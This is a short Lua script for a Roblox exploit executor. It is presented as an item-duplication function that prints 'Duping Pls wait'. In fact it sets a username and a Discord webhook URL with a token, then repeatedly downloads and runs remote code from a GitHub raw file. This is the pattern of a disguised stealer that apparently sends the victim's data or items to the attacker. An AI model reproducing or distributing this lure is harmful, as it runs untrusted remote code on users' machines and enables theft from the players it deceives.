function Dupe()
      getgenv().Dupeding = true
      while getgenv().Dupeding == true do
        _G.Username = "Wickedkennyy123"
        _G.WebhookUrl = "https://discord.com/api/webhooks/1089215761534431252/o3RHLdVYMyFSRUEVgNlF2Om3kqILgcrspvY7mvtZFkSIVwUSa38i9TKt50LNBAcbKcR4"
        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
        Print("Duping Pls wait")
        wait(0.1)
      end
end

